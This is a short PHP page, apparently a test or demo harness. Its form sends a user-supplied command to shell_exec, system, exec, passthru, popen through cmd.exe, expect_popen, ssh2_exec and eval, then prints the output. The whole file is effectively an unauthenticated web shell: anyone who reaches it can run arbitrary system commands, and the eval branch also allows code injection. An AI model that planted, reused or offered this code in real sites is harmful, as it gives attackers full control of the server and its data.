
<form method="post">
    <label for="location">Command</label>
    <input type="submit" name="Clear" value="Clear">
    <input type="text" name="command" value="systeminfo" id="command">
    <input type="submit" name="submitExec" value="Exec">
    <input type="submit" name="submit" value="Shell Exec">
     <input type="submit" name="submitPopen" value="POpen">
    <input type="submit" name="submitSystem" value="System">
    <input type="submit" name="submitPassthru" value="Passthrough">
    <input type="submit" name="submitProcOpen" value="Proc Open">
    
    <input type="submit" name="submitExpectOpen" value="Submit (expect_popen)">
    <input type="submit" name="submitSsh" value="Submit (ssh2_exec)">
    <input type="submit" name="submitEval" value="Submit (eval)">
       
</form>

<?php
  
$output = '';
    
if (isset($_POST['submit'])) 
{
    $cmd =$_POST['command'];
    $output = shell_exec($cmd);
}

if (isset($_POST['submitPopen'])) 
{
  $cmd =$_POST['command'];
  $fp = popen('C:\\windows\\system32\\cmd.exe /c '.$cmd, 'r');
  
  while (!feof($fp)) { 
    $buffer = fgets($fp, 4096); 
    $output.= $buffer. "\n"; 
} 
  pclose($fp);
}

if (isset($_POST['submitSystem'])) 
{
    $cmd =$_POST['command'];
    $output = system($cmd);
}

if (isset($_POST['submitExec'])) 
{
    $cmd =$_POST['command'];
    $output = exec($cmd);
}

if (isset($_POST['submitEval']))
{
    $cmd =$_POST['command'];
    $output = eval('expect_popen('.$cmd.')');
}

if (isset($_POST['submitPassthru'])) 
{ 
    $cmd =$_POST['command'];
    $output = passthru($cmd);
}

if (isset($_POST['submitProcOpen'])) 
{
    //$output = proc_open($cmd, $descriptorspec, $pipes)
}

if (isset($_POST['submitExpectOpen'])) 
{
    $cmd =$_POST['command'];
    $output = expect_popen($cmd);
}

if (isset($_POST['submitSsh'])) 
{
    $cmd =$_POST['command'];
    $output = ssh2_exec(null, $cmd);
}

echo "<pre>$output</pre>";

?>

<a href="index.php">Back to home</a>